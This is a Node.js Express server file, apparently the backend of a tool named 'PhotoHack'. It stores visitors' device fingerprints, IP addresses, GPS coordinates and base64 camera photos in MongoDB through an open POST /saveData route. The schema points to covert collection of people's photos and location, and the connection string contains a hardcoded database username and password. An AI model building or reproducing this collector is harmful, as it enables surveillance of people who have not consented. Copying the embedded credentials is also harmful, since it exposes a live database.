const express = require("express");
const mongoose = require("mongoose");
const bodyParser = require("body-parser");
const cors = require("cors");

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: "50mb" }));
app.use(bodyParser.urlencoded({ limit: "50mb", extended: true }));
// Connect to MongoDB Atlas
mongoose
  .connect(
    "mongodb+srv://rahul:kushwah@cluster0.naijc.mongodb.net/PhotoHack?retryWrites=true&w=majority&appName=Cluster0",
    {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    }
  )
  .then(() => console.log("MongoDB connected"))
  .catch((err) => console.error("MongoDB connection error:", err));

// Define a schema
const UserSchema = new mongoose.Schema({
  userAgent: String,
  language: String,
  screenSize: String,
  timezone: String,
  platform: String,
  hardwareConcurrency: String,
  deviceMemory: String,
  appName: String,
  appVersion: String,
  vendor: String,
  cookiesEnabled: Boolean,
  product: String,
  ipAddress: String,
  latitude: Number,
  longitude: Number,
  browserFingerprint: String,
  photos: [String], // Array of base64 photos
  captureTime: String,
});

const UserData = mongoose.model("UserData", UserSchema);

// POST route to store user data
app.get("/check", async (req, res) => {
  try {
    res.status(200).json({ message: "API is working!" });
  } catch (error) {
    res.status(500).json({ error: "Failed to save data." });
  }
});


// POST route to store user data
app.post("/saveData", async (req, res) => {
  try {
    const newUser = new UserData(req.body);
    await newUser.save();
    res.status(200).json({ message: "Data saved successfully!" });
  } catch (error) {
    res.status(500).json({ error: "Failed to save data." });
  }
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
